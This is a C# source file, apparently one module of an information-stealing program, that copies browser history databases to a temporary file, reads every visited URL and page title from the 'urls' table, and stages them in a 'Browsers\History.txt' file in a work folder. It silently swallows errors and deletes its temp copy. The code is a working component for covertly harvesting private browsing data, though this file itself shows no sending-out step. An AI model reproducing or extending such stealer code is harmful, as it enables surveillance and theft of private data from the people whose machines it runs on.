using System.Collections.Generic;
using System.IO;
using System.Text;

namespace who.Func
{
    class History
    {
        public static void Get()
        {
            string text = "";
            List<HissData> pwd = GetHistory();

            foreach (HissData i in pwd)
            {
                text += i.ToString();
            }

            if (text != "")
            {
                if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
                    Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");

                File.WriteAllText(Dirs.WorkDir + "\\Browsers\\History.txt", text, Encoding.Default);
            }          
        }

        public static List<HissData> GetHistory()
        {
            List<HissData> hissDataList1 = new List<HissData>();

            foreach (string basePath in Dirs.BrowsHistory)
            {
                List<HissData> hissDataList2 = FetchHistory(basePath);
                if (hissDataList2 != null)
                    hissDataList1.AddRange(hissDataList2);
            }
            return hissDataList1;
        }

        private static List<HissData> FetchHistory(string basePath)
        {
            try
            {
                string str2 = Dirs.WorkDir + "test.fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                SqlHandler sqlHandler = new SqlHandler(str2);
                List<HissData> hissDataList = new List<HissData>();
                sqlHandler.ReadTable("urls");
                for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                {
                    try
                    {
                        string empty = string.Empty;
                        try
                        {
                           empty = sqlHandler.GetValue(rowNum, 5);
                        }
                        catch 
                        {   }

                        if (empty != "")
                            hissDataList.Add(new HissData()
                            {
                                Url = sqlHandler.GetValue(rowNum, 1),
                                Title = sqlHandler.GetValue(rowNum, 2)
                            });
                
                    }
                    catch 
                    {  }
                }
                File.Delete(str2);
                return hissDataList;
            }
            catch 
            {
                return null;
            }
        }
    }

    class HissData
    {
        public string Url { get; set; }

        public string Title { get; set; }

        public override string ToString()
        {
            return string.Format("{0} | {1}\r\n \r\n", Title, Url);
        }
    }
}
